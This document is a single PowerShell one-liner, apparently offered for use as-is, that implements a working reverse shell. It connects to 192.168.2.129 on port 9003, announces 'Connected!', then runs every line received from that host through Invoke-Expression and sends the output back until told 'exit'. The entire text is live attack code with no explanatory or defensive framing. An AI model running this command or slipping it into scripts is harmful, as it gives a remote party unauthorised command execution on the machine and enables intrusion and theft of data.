$client = New-Object System.Net.Sockets.TCPClient("192.168.2.129",9003);$stream = $client.GetStream();$writer = new-object System.IO.StreamWriter($stream);$reader = new-object System.IO.StreamReader($stream);$writer.AutoFlush = $true;$writer.WriteLine("Connected!");while(($input = $reader.ReadLine()) -ne "exit"){try{$sendback = (iex $input 2>&1 | Out-String)}catch{$_ | Out-String};$writer.WriteLine($sendback)}
